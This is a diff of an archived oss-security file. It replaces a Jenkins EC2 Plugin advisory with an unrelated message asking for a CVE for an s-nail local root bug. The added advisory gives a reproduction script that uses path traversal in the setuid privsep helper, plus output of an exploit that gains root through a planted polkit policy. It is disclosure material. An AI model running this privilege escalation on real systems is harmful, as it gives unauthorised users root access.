@@ -1,38 +1,120 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/12/06/2
-Message-Id: <8AE227B9-E337-45DC-9D8A-C4DB2452FB87@beckweb.net>
-Date: Wed, 6 Dec 2017 14:37:19 +0100
-From: Daniel Beck <ml@...kweb.net>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/02/05/6
+Message-ID: <c227f38a-f873-fbf8-b4bc-220df1b31066@yahoo.fr>
+Date: Sun, 5 Feb 2017 02:01:55 +0100
+From: wapiflapi <wapiflapi@...oo.fr>
 To: oss-security@...ts.openwall.com
-Subject: Jenkins EC2 Plugin 1.37 and earlier arbitrary shell command execution
+Cc: Steffen Nurpmeso <steffen@...oden.eu>
+Subject: Re: CVE Request: s-nail local root
 Content-Type: text/plain; charset=utf-8
 
-Jenkins is an open source automation server which enables developers around
-the world to reliably build, test, and deploy their software. The following
-plugin releases contain fixes for security vulnerabilities:
+Hi,
 
-* EC2 Plugin 1.38
+Still no update on this. If here is not the right place can someone
+please point me to where I should ask for a CVE for this fixed local
+root in s-nail?
 
-Users of these plugins should upgrade them to the indicated versions.
+Thanks!
 
-Descriptions of the vulnerabilities are below. Some more details, 
-severity, and attribution can be found here:
-https://jenkins.io/security/advisory/2017-12-06/
-
-We provide advance notification for security updates on this mailing list:
-https://groups.google.com/d/forum/jenkinsci-advisories
-
-If you discover security vulnerabilities in Jenkins, please report them as
-described here:
-https://jenkins.io/security/#reporting-vulnerabilities
-
----
-
-SECURITY-643
-Users with permission to create or configure agents in Jenkins could
-configure an EC2 agent to run arbitrary shell commands on the master node
-whenever the agent was supposed to be launched.
-
-Configuration of these agents now requires the 'Run Scripts' permission
-typically only granted to administrators.
+On 01/27/2017 10:03 PM, wapiflapi wrote:
+> Hi,
+> 
+> s-nail fixed a local root. This affects archlinux by default and other
+> linux distros' packages (eg. ubuntu). Can we get a CVE for this ?
+> 
+> https://www.mail-archive.com/s-nail-users@lists.sourceforge.net/msg00551.html
+> 
+> Here is the advisory:
+> 
+> Affects
+> =======
+> 
+> S-nail (later S-mailx) is a mail processing system. It is intended to
+> provide the functionality of the POSIX mailx command. It is installed by
+> default on archlinux and is pulled in on ubuntu whenever mailx is
+> needed. It might be used elsewhere.
+> 
+> There is a vulnerability in the setuid root helper binary s-nail uses to
+> handle lock files:
+> 
+>   - archlinux: /usr/lib/mail-privsep
+>   - ubuntu:    /usr/lib/s-nail/s-nail/privsep
+> 
+> 
+> Reproducing the issue
+> =====================
+> 
+> The problem is that an O_EXCL file is created with a user controlled
+> path because the di.di_hostname and di.di_randstr are never checked.
+> This means that using s-nail-privsep a normal user can create a file
+> anywhere on the filesystem, which is a security problem.
+> 
+> The command is very picky about it's arguments. Here is an example
+> script setting up the bug. This runs the setuid binary under strace so
+> we can see the call to open() that we control followed by a call to
+> fchown() giving us ownership.
+> 
+> 
+> ```
+> # On archlinux it should be: /usr/lib/mail-privsep
+> PRIVSEP=/usr/lib/s-nail/s-nail-privsep;
+> 
+> # Some setup to get the directory traversal working.
+> touch /tmp/foo
+> mkdir -p /tmp/foo.lock.spam.eggs
+> 
+> cd $(dirname $PRIVSEP);
+> PATH=$PATH:. # argv[0] must be just the name.
+> 
+> # stdin & stdout must be pipes !
+> echo | strace -f $(basename $PRIVSEP) rdotlock \
+>               mailbox /tmp/foo name /tmp/foo.lock \
+>               hostname spam randstr eggs/../../../../../../../tmp/test \
+>               pollmsecs 0 |& grep -E "foo\.lock\.spam\.eggs|chown";
+> ```
+> 
+> 
+> Security Impact
+> ===============
+> 
+> This issue can be leveraged by any logged in user to gain full root
+> privileges.
+> 
+> To exploit this we have to win a race condition and find a way to
+> leverage the ephemeral file. We achieve this by adding a polkit policy
+> and using pkexec su.
+> 
+> A functional exploit is attached :-) Should look like this:
+> 
+> ```
+> $ id
+> uid=1000(wapiflapi) gid=1000(wapiflapi) groups=1000(wapiflapi)[...]
+> $ ./s-nail-privget /usr/lib/s-nail/s-nail-privsep
+> [=] s-nail-privsep local root by @wapiflapi
+> [+] Started flood in /usr/share/polkit-1/actions/backdoor.policy
+> [+] Started race with /usr/lib/s-nail/s-nail-privsep
+> [=] This could take a while...
+> [/] wait for it: done
+> root@box:~# id
+> uid=0(root) gid=0(root) groups=0(root)
+> ```
+> 
+> If the system doesn't have pkexec there are other ways to get root
+> access from this. (`at` and `crontab` files come to mind.) The exploit
+> is a bit slow (20s?), it's probably possible to be smarter about the
+> race, but it's a poc ! ;-) Also if testing in a VM, having more than one
+> cpu core helps a lot.
+> 
+> 
+> Issue Timeline
+> ==============
+> 
+> discovery:  26/01/2016
+> disclosure: 27/01/2016
+> vendor fix: 27/01/2016
+> 
+> 
+> Regards,
+> Wannes `wapiflapi` Rombouts
+> 
 
